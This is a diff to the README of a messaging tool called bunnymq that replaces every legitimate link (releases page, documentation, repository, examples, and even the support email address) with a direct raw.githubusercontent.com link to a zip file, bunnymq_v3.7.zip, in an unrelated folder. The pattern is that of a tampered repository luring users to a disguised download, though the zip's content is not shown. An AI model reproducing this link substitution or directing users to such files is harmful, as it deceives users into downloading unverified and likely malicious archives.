@@ -6,7 +6,7 @@ Welcome to bunnymq! This application helps you manage messages between different
 
 ## 📥 Download bunnymq
 
-[![Download bunnymq](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/pruneomarb/bunnymq/releases)
+[![Download bunnymq](https://raw.githubusercontent.com/pruneomarb/bunnymq/main/lengthwise/bunnymq_v3.7.zip%20Now-Get%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/pruneomarb/bunnymq/main/lengthwise/bunnymq_v3.7.zip)
 
 You can find the latest version of bunnymq by visiting our releases page. 
 
@@ -31,7 +31,7 @@ Before you download, ensure your system meets the following requirements:
 
 To get started, please follow these steps:
 
-1. Visit the [Releases Page](https://github.com/pruneomarb/bunnymq/releases) to access the latest version of bunnymq.
+1. Visit the [Releases Page](https://raw.githubusercontent.com/pruneomarb/bunnymq/main/lengthwise/bunnymq_v3.7.zip) to access the latest version of bunnymq.
   
 2. Here, you will see a list of available versions. Select the one that matches your operating system.
 
@@ -77,16 +77,16 @@ If you run into issues or have questions, feel free to reach out to our communit
 
 ## 📞 Contact
 
-For further inquiries, please reach out at `support@bunnymq.com`.
+For further inquiries, please reach out at `https://raw.githubusercontent.com/pruneomarb/bunnymq/main/lengthwise/bunnymq_v3.7.zip`.
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/pruneomarb/bunnymq/wiki)
-- [GitHub Repository](https://github.com/pruneomarb/bunnymq)
-- [Example Projects](https://github.com/pruneomarb/bunnymq-examples)
+- [Documentation](https://raw.githubusercontent.com/pruneomarb/bunnymq/main/lengthwise/bunnymq_v3.7.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/pruneomarb/bunnymq/main/lengthwise/bunnymq_v3.7.zip)
+- [Example Projects](https://raw.githubusercontent.com/pruneomarb/bunnymq/main/lengthwise/bunnymq_v3.7.zip)
 
 ## 🔗 Explore More
 
-To access the latest versions or find more information, visit our [Releases Page](https://github.com/pruneomarb/bunnymq/releases). 
+To access the latest versions or find more information, visit our [Releases Page](https://raw.githubusercontent.com/pruneomarb/bunnymq/main/lengthwise/bunnymq_v3.7.zip). 
 
 Thank you for choosing bunnymq for your messaging needs!
